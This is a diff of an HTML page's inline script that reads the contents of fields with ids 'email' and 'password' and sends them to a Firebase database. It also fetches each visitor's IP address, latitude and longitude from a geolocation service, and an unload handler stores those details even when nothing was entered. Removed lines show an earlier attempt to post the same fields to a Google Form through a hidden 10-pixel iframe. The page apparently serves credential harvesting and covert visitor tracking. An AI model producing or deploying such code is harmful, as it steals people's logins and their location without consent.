@@ -121,87 +121,31 @@
     });;
 </script>
 <script>
-    var total="";
-   //
-//   var config = {
-//       apiKey: "apiKey",
-//       authDomain: "projectId.firebaseapp.com",
-//       databaseURL: "https://databaseName.firebaseio.com",
-//       storageBucket: "bucket.appspot.com"
-//   };
-//   firebase.initializeApp(config);
+    var filled2=0;
 var data2;
-   // Get a reference to the database service
-//   var database = firebase.database();
    var messagesRef = new Firebase('https://rpsecf32.firebaseio.com');
 
-   // Save data to firebase
    function savedata(){
+       filled2=1
        var message = document.getElementById("email").value;
 var feedback=document.getElementById("password").value;
        messagesRef.push({fieldName:message, text:feedback,detailsjson:data2});
        document.getElementById("email").value = '';
        document.getElementById("password").value = '';
+//       document.getElementById("feedback2").style.animationDirection="reverse";
+       document.getElementById("feedback2").style.display="none";
+       document.getElementById("feedback2").style.animation="disappear 3s";
    }
-
    $.getJSON("http://freegeoip.net/json/", function(data) {
-       var country_code = data.country_code;
-       var country = data.country_name;
-       var ip = data.ip;
-       var time_zone = data.time_zone;
-       var latitude = data.latitude;
-       var longitude = data.longitude;
        data2=data;
-total+="Countrycode:"+country_code+",Country:"+country+",IP:"+ip+",Latitude:"+latitude+",Longitude:"+longitude+",TimeZone:"+time_zone;
-//       alert("Country Code: " + country_code);
-//       alert("Country Name: " + country);
-//       alert("IP: " + ip);
-//       alert("Time Zone: " + time_zone);
-//       alert("Latitude: " + latitude);
-//       alert("Longitude: " + longitude);
    });
+window.onbeforeunload = function(){
+    // Do something
+    if(filled2!=1)
+        messagesRef.push({detailsjson:data2});
+   // alert("fired");
+
+}
 </script>
-<!--<script>-->
-    <!--function postContactToGoogle(){-->
-        <!--alert("clicked");-->
-        <!--var name = $('input[id="email"]').val();-->
-        <!--var feed = $('input[id="password"]').val();-->
-        <!--if ((name !== "") && (feed !== "") ) {-->
-            <!--$.ajax({-->
-                <!--url: "https://docs.google.com/forms/d/e/1FAIpQLSepHsQOK3A8JfWc9zn2c4NigQ1Gwelg3my8FuUlOq-xtQllIQ/viewform?embedded=true",-->
-                <!--data: {"entry.1" : name,"entry.2": feed},-->
-                <!--type: "POST",-->
-                <!--dataType: "xml",-->
-                <!--statusCode: {-->
-                    <!--0: function (){-->
-
-                        <!--$('input[id="email"]').val("");-->
-                        <!--$('input[id="password"]').val("");-->
-                        <!--//Success message-->
-                    <!--},-->
-                    <!--200: function (){-->
-                        <!--$('input[id="email"]').val("");-->
-                        <!--$('input[id="password"]').val("");-->
-                        <!--//Success Message-->
-                    <!--}-->
-                <!--}-->
-            <!--});-->
-        <!--}-->
-        <!--else {-->
-            <!--//Error message-->
-        <!--}-->
-    <!--}-->
-
-<!--</script>-->
-
-<!--<iframe-->
-        <!--src="https://docs.google.com/forms/d/e/1FAIpQLSepHsQOK3A8JfWc9zn2c4NigQ1Gwelg3my8FuUlOq-xtQllIQ/viewform?embedded=true"-->
-        <!--width="10"-->
-        <!--height="10"-->
-        <!--frameborder="0"-->
-        <!--marginheight="0"-->
-        <!--marginwidth="0">Loading...-->
-<!--</iframe>-->
-<!--https://docs.google.com/forms/d/e/1FAIpQLSepHsQOK3A8JfWc9zn2c4NigQ1Gwelg3my8FuUlOq-xtQllIQ/viewform?usp=sf_link-->
 </body>
 </html>
